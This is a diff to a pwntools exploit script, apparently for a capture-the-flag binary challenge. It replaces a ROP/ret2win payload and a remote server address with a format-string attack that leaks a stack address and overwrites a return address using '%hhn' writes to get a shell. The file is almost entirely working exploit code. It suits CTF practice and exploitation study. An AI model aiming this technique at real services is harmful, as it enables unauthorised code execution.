@@ -1,6 +1,6 @@
 from pwn import *
-HOST='103.167.136.75'
-PORT=11201
+HOST=''
+PORT=11
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
@@ -33,7 +33,7 @@ continue
 '''.format(**locals())
 
 # Binary filename
-exe = './soal'
+exe = './chall'
 # This will automatically get context arch, bits, os etc
 elf = context.binary = ELF(exe, checksec=False)
 # Change logging level to help with debugging (error/warning/info/debug)
@@ -48,21 +48,29 @@ context.log_level = 'debug'
 # ld = ELF("./ld-2.27.so")
 
 # Pass in pattern_size, get back EIP/RIP offset
-offset = 40
-win = 0x004011a1
 rop = ROP(elf)
 # Start program
 io = start()
 
 # Build the payload
-payload = flat({
-    offset: [
-        rop.chain()
-    ]
-})
+payload = b"AAAABBBBCCCC"
+payload += b"%p-" * 40
 
+# 0x7fffcfac3eb0 + 40
 # Send the payload
-# io.sendlineafter(b'}\n', payload)
-io.sendline(payload)
+io.recvuntil(b"leak ")
+leak_buff = int(io.recvline().decode().strip(), 16)
+
+info("LEAK: " + hex(leak_buff))
+
+offset_ret = 24
+ret = leak_buff - offset_ret
+
+to_write = "%{}c%6$hhn".format(0xb0 - 8)
+payload = p64(ret) + to_write.encode()
+
+print(payload)
+
+io.sendlineafter(b'>', payload)
 # Got Shell?
 io.interactive()
